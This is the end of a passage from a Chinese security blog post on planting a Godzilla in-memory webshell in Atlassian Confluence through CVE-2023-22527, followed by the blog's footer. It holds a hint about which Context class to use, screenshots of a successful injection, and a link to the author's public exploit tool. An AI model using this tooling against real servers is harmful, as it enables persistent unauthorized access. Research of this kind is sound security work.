&#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们获取Context的类需要改为<code>com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager</code><br>最后即可成功注入内存马<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674727825-ea68b0d7-3583-4f91-afc5-d13d95fb86d0.png#averageHue=%232e3238&clientId=u9363bb59-db00-4&from=paste&height=628&id=u09843151&originHeight=785&originWidth=1791&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221735&status=done&style=none&taskId=u4b03b03c-84c8-4fe0-9193-f24a895a408&title=&width=1432.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674737268-aabf2ea3-9c8a-4880-8d07-0c19fa701ddb.png#averageHue=%232b2d37&clientId=u9363bb59-db00-4&from=paste&height=170&id=ue679e982&originHeight=213&originWidth=1206&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=142770&status=done&style=none&taskId=u6592bfa5-1e00-45df-9bce-587efc042ac&title=&width=964.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674747236-6741de8c-dc10-4c07-8643-1373b998be13.png#averageHue=%23f0f0ef&clientId=u9363bb59-db00-4&from=paste&height=520&id=ub118c935&originHeight=650&originWidth=611&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34105&status=done&style=none&taskId=u5342363e-2f8f-4b70-a3fe-75a3fb7ac03&title=&width=488.8" alt="image.png"></p>
<h1 id="工具制作"><a href="#工具制作" class="headerlink" title="工具制作"></a>工具制作</h1><p>工具参考北辰师傅的<code>[CVE-2022-26134-Godzilla-MEMSHELL](https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL)</code>，做了些简单的改写。<br>已经在Github上传<br><a target="_blank" rel="noopener" href="https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL">https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL</a><br>师傅要是觉得不错的话可以给个Star支持一下呀</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CVE/" class="tag">#CVE</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/29/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">BCEL环境下利用全反射构造高可用内存马</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/26/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">【.NET 安全】ASP.NET SoapFormatter Deserialization 04</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>